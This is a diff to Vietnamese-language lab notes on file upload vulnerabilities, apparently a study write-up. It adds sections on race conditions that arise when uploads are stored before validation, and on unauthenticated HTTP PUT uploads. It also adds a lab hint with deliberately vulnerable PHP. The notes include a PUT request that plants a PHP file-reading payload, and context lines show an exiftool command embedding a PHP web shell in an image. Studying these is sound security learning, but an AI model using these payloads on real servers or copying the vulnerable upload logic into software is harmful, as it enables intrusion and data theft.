@@ -114,8 +114,30 @@ $\implies$ Bypass được cả kiểm duyệt filename, file extension, Magic B
 - `%2f` &rarr; `/`
 - `....//` &rarr; `../`
 
-### 4.5 Lưu tạm file trên hệ thống trước khi validate
+### 4.5 Các loại filter/ lỗ hổng khác
+#### Lưu tạm file trên hệ thống trước khi validate
+\- Cơ chế: Lưu file vào mục tạm hoặc lưu trực tiếp trên hệ thống trong 1 khoảng thời gian, đưa vào các hàm để check file có an toàn hay không 
+
 \- Cách này tạo khoảng trống cho Race condition (Lab cuối), chỉ một tích tắc file tồn tại trên web cũng có thể dẫn đến lỗ hổng nghiêm trọng
+
+\- Bypass: 
+- Cần trích xuất được source code để xem mục mà file được lưu "tạm" trong vài giây
+- Turbo Intruder
+
+#### Lỗ hổng tải file bằng method PUT
+\- Server cấu hình sai, cho phép HTTP PUT nhưng thiếu xác thực hoặc phân quyền đối với các hệ thống thư mục
+
+\- Quản trị viên đã vô tình để mở quyền 4 cho phép các phương thức HTTP nguy hiểm tác động vào filesystem, ví dụ:
+```
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
+```
+
+
 
 
 
@@ -281,6 +303,50 @@ exiftool -Comment="<?php system($_REQUEST['cmd']); ?>" abc.jpg
 <img width="794" height="175" alt="image" src="https://github.com/user-attachments/assets/62da3c1f-3013-44b3-b6fa-03cbecf12635" />
 
 - Vì binary rác quá nhiều, ta cần đánh dấu secret kẹp giữa "START" và "END" để tường minh hơn
+
+
+# Lab 07
+<img width="1059" height="432" alt="image" src="https://github.com/user-attachments/assets/c61eb955-3f4e-43d8-a6ff-ad95315c49b1" />
+
+
+<details>
+  
+  <summary>Hint</summary> 
+ 
+```
+  <?php
+$target_dir = "avatars/";
+$target_file = $target_dir . $_FILES["avatar"]["name"];
+
+// temporary move
+move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
+
+if (checkViruses($target_file) && checkFileType($target_file)) {
+    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
+} else {
+    unlink($target_file);
+    echo "Sorry, there was an error uploading your file.";
+    http_response_code(403);
+}
+
+function checkViruses($fileName) {
+    // checking for viruses
+    ...
+}
+
+function checkFileType($fileName) {
+    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
+    if($imageFileType != "jpg" && $imageFileType != "png") {
+        echo "Sorry, only JPG & PNG files are allowed\n";
+        return false;
+    } else {
+        return true;
+    }
+}
+?>
+```
+  
+</details>
 
  
 
